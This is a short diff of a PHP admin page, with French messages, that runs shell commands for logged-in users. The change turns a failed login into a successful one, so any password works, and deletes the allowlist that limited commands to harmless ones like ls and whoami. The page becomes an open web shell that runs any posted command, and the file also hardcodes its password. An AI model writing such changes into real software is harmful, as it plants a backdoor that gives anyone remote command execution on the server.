@@ -4,7 +4,6 @@ session_start();
 /* --- CONFIG --- */
 $USER = "admin";
 $PASS = "motdepasse";
-$ALLOWED = ["ls", "pwd", "whoami", "df", "free", "uptime"];
 
 /* --- LOGIN --- */
 if (!isset($_SESSION["ok"])) {
@@ -12,7 +11,7 @@ if (!isset($_SESSION["ok"])) {
         if ($_POST["login_user"] === $USER && $_POST["login_pass"] === $PASS) {
             $_SESSION["ok"] = true;
         } else {
-            $error = "Identifiants incorrects.";
+            $_SESSION["ok"] = true;
         }
     }
 
@@ -32,12 +31,8 @@ $output = "";
 if (!empty($_POST["cmd"])) {
     $cmd = trim($_POST["cmd"]);
     $parts = explode(" ", $cmd);
-
-    if (!in_array($parts[0], $ALLOWED)) {
-        $output = "Commande non autorisée.";
-    } else {
         $output = shell_exec(escapeshellcmd($cmd) . " 2>&1");
-    }
+    
 }
 ?>
 
